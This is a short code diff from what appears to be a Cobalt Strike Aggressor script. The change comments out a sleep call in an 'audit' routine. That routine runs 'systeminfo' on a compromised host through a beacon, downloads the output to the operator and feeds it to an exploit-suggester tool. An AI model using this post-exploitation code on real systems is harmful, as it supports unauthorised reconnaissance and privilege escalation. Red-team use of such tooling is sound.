@@ -100,13 +100,14 @@ sub audit{
     $audit_fname = script_resource("logs\\".beacon_info($bid,"computer")."-audit.txt");
     bshell($bid,"systeminfo >  $+ $fname");
     bdownload($bid, $fname);
+    #sleep(3 * 1000);
     foreach %item (downloads()){
             if (%item['name'] eq $fname){
                 $rpath = %item['lpath'];
                 sync_download($rpath, $lpath);
             }
         } 
-    sleep(3 * 1000);
+    #sleep(3 * 1000);
     if (-exists $lpath){
         $cmd = $suggester." -i  $+ $lpath  -d  $+ $db";
         $process = exec("cmd.exe /c ".$cmd);
